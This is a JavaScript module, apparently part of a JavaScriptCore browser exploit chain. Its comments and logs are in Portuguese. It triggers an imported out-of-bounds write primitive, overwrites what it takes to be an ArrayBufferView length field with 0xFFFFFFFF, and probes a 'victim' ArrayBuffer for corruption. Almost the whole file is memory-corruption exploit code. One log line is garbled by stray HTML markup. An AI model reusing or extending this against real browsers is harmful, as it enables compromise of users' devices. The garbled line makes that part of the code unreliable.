// js/script3/testVictimABInteractionAfterCorruption.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "VictimABInteractionTest_v26";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64; // Definida no escopo do módulo

export async function executeDirectVictimProbeTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE}.directVictimProbe`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Sondagem Direta em victim_ab Pós-Corrupção OOB ---`, "test", FNAME_CURRENT_TEST);
    document.title = `DirectVictimProbe v26`;

    let errorCaptured = null;
    let potentiallyCrashed = true;
    let lastStep = "init";
    let victim_byteLength_observed_val = "N/A";
    let dataview_read_observed_val = "N/A";
    let slice_ok_observed_val = false;

    const FAKE_VIEW_BASE_OFFSET_IN_OOB_local = 0x58; 
    const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetInView)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        return { 
            test_description: FNAME_CURRENT_TEST,
            errorOccurred: new Error("Invalid M_LENGTH_OFFSET in config"), 
            potentiallyCrashed: false, 
            victim_byteLength_observed: victim_byteLength_observed_val,
            dataview_read_observed: dataview_read_observed_val,
            slice_ok_observed: slice_ok_observed_val
        };
    }
    const corruptionTargetOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB_local + mLengthOffsetInView; 

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   (Offset de corrupção em oob_array_buffer_real será: ${toHex(corruptionTargetOffset)})`, "info", FNAME_CURRENT_TEST);

        lastStep = "critical_oob_write";
        logS3(`PASSO 1: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffset)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffset, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffset)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100); 

        lastStep = "victim_creation_and_probe";
        logS3(`PASSO 2: Criando victim_ab (${VICTIM_AB_SIZE} bytes) e sondando diretamente...`, "test", FNAME_CURRENT_TEST);
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`  victim_ab criado.`, "info", FNAME_CURRENT_TEST);

        try {
            victim_byteLength_observed_val = victim_ab.byteLength;
            logS3(`  victim_ab.byteLength: ${victim_byteLength_observed_val}`, "leak", FNAME_CURRENT_TEST);
            if (victim_byteLength_observed_val !== VICTIM_AB_SIZE) {
                logS3(`    !!!! TAMANHO INESPERADO PARA victim_ab !!!! Esperado: ${VICTIM_AB_SIZE}, Obtido: ${victim_byteLength_observed_val}`, "critical", FNAME_CURRENT_TEST);
                document.title = `DirectProbe: victim_ab size ${victim_byteLength_observed_val}!`;
            }
        } catch (e_bl) {
            logS3(`    ERRO ao ler victim_ab.byteLength: ${e_bl.name} - ${e_bl.message}`, "error", FNAME_CURRENT_TEST);
            if(!errorCaptured) errorCaptured = e_bl;
        }

        if (!errorCaptured && VICTIM_AB_SIZE >=4) { 
            try {
                let dv = new DataView(victim_ab);
                dv.setUint32(0, 0x44434241, true); 
                dataview_read_observed_val = toHex(dv.getUint32(0, true));
                logS3(`  DataView em victim_ab: Escrito 0x44434241, Lido de volta: ${dataview_read_observed_val}`, "info", FNAME_CURRENT_TEST);
                if (dataview_read_observed_val !== "0x44434241") {
                     logS3(`    AVISO: Leitura/Escrita via DataView em victim_ab falhou ou retornou valor incorreto.`, "warn", FNAME_CURRENT_TEST);
                }
            } catch (e_dv) {
                logS3(`    ERRO ao usar DataView em victim_ab: ${e_dv.name} - ${e_dv.message}`, "error", FNAME_CURRENT_TEST);
                if(!errorCaptured) errorCaptured = e_dv;
            }
        }

        if (!errorCaptured) {
            try {
                victim_ab.slice(0,4);
                slice_ok_observed_val = true;
                logS3(`  victim_ab.slice(0,4) executado com sucesso.`, "info", FNAME_CURRENT_TEST);
            } catch (e_slice) {
                logS3(`    ERRO ao chamar victim_ab.slice(0,4): ${e_slice.name} - ${e_slice.message}`, "error", FNAME_CURRENT_TEST);
                 if(!errorCaptured) errorCaptured = e_slice;
            }
        }
        potentiallyCrashed = false; 

    } catch (e_main) {
        errorCaptured = e_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL: ${e_main.name} - ${e_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_main.stack) logS3(`Stack: ${e_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE} FALHOU: ${e_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        test_description: FNAME_CURRENT_TEST,
        errorOccurred: errorCaptured, 
        potentiallyCrashed,
        victim_byteLength_observed: victim_byteLength_observed_val,
        dataview_read_observed: dataview_read_observed_val,
        slice_ok_observed: slice_ok_observed_val
    };
}
